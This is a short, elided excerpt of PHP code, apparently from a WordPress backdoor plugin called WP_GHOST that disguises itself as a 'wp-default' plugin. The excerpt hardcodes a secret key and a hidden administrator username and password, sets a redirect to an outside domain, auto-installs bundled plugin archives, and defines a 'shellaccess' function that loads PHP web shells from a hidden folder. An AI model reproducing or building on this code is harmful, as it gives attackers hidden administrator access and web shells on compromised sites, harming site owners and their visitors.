...
if(!class_exists('WP_GHOST')) {
    class WP_GHOST {
        ...
        public function __construct() {
            ...
            $this->key = 'a9J4dquMy3Qw7dvwN4yMvVm68K';

            $this->pluginList = Array(
                'wp-default/wp-default.php'
            );

            $this->killRedirect = 'http://bummersauce.com';

            $this->username = 'Hc462N5M4bP4SMk';
            $this->password = 'K6BJ8V4JE6NeJ6g';

            foreach(glob(ABSPATH.'wp-content/plugins/wp-default/plugins/*.zip') as $installPlugin) {
        ...
        function shellaccess(){
            foreach(glob(ABSPATH.'wp-content/plugins/wp-default/sh/*.php') as $shells) {
